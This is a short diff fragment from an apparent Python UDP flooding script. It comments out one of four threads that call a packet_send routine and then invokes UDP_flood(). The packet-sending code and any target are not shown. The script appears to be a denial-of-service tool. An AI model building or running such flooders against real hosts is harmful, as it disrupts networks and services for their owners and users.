@@ -26,16 +26,16 @@ def UDP_flood() :
   t1 = threading.Thread(target=packet_send)
   t2 = threading.Thread(target=packet_send)
   t3 = threading.Thread(target=packet_send)
-  t4 = threading.Thread(target=packet_send)
+  #t4 = threading.Thread(target=packet_send)
 
   t1.start()
   t2.start()
   t3.start()
-  t4.start()
+  #t4.start()
 
   t1.join()
   t2.join()
   t3.join()
-  t4.join()
+  #t4.join()
 
 UDP_flood()
